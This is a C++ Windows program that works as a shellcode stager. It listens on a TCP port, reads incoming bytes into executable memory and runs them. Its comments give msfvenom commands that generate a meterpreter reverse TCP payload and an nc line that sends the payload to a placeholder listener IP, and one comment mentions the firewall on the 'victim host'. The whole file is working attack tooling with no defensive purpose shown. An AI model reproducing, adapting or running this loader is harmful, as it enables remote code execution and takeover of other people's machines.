#include <WinSock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#include <iostream>

#pragma comment(lib, "ws2_32.lib")

/*
	msfvenom -p windows/x64/meterpreter_reverse_tcp lhost= lport= exitfunc=thread -f c > met.c
	cat met.c | tr -d "\"" | tr -d ";" | tr -d  '\n' | tee met2.c
	echo -e `cat met2.c` | nc -v <listener ip> <listener port>
*/

/*
	mind FW on the victim host
*/

int main(int argc, const char * argv[])
{
	PCSTR port = argv[1];

	LPWSADATA wsaData = new WSAData();
	ADDRINFOA* socketHint = new ADDRINFOA();
	ADDRINFOA* addressInfo = new ADDRINFOA();
	SOCKET listenSocket = INVALID_SOCKET;
	SOCKET clientSocket = INVALID_SOCKET;
	int stage2 = 203846; //msfvenom -p windows/x64/meterpreter_reverse_tcp lhost= lport= -f c | grep bytes
	void* bufferReceivedBytes = malloc(stage2);
	INT receivedBytes = 0;

	socketHint->ai_family = AF_INET;
	socketHint->ai_socktype = SOCK_STREAM;
	socketHint->ai_protocol = IPPROTO_TCP;
	socketHint->ai_flags = AI_PASSIVE;

	WSAStartup(MAKEWORD(2, 2), wsaData);
	GetAddrInfoA(NULL, port, socketHint, &addressInfo);

	listenSocket = socket(addressInfo->ai_family, addressInfo->ai_socktype, addressInfo->ai_protocol);
	bind(listenSocket, addressInfo->ai_addr, addressInfo->ai_addrlen);
	listen(listenSocket, SOMAXCONN);
	int receivedAll = 0;
	clientSocket = accept(listenSocket, NULL, NULL);
	LPVOID shellcode = VirtualAlloc(NULL, stage2, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	LPVOID bakAddr = shellcode;
	do
	{
		receivedBytes = recv(clientSocket, (char *)bufferReceivedBytes, stage2, NULL);
		receivedAll += receivedBytes;
		printf("receivedBytes: %d\n", receivedBytes);
		memcpy(shellcode, bufferReceivedBytes, receivedBytes);
		shellcode = ((char*)shellcode) + receivedBytes;
		stage2 = stage2 - receivedBytes;
		printf("left: %d\n", stage2);
	} while (stage2 > 0);
	free(bufferReceivedBytes);
	((void(*)())bakAddr)();
}